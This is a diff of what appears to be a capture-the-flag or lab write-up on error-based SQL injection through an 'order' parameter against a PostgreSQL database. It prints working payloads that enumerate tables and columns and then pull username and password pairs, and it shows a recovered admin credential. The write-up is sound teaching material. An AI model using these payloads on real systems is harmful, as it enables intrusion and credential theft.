@@ -34,18 +34,18 @@ A series of queries were executed to exploit the vulnerability:
 
     Table Enumeration:
     ?action=contents&order=ASC, (select cast(string_agg(table_name, $$ , $$) as int) from information_schema.tables where table_schema=$$public$$)
-    Response: m3mbr35t4bl3
+    Response: 35t4bl3
 
 
 
     Column Enumeration:
-    ?action=contents&order=ASC, (select cast(string_agg(column_name, $$ , $$) as int) from information_schema.columns where table_name = $$m3mbr35t4bl3$$)
-    Response: id , us3rn4m3_c0l , p455w0rd_c0l , em41l_c0l
+    ?action=contents&order=ASC, (select cast(string_agg(column_name, $$ , $$) as int) from information_schema.columns where table_name = $$35t4bl3$$)
+    Response: id , n4m3_ , p455w0rd_ , em41l_
 
 
 
     Data Exfiltration:
-    ?action=contents&order=ASC, (select cast(string_agg(us3rn4m3_c0l || $$:$$ || p455w0rd_c0l, $$ | $$) as int) from m3mbr35t4bl3)
+    ?action=contents&order=ASC, (select cast(string_agg(n4m3_ || $$:$$ || p455w0rd_, $$ | $$) as int) from 35t4bl3)
     Response: admin:1a2BdKT
 
 
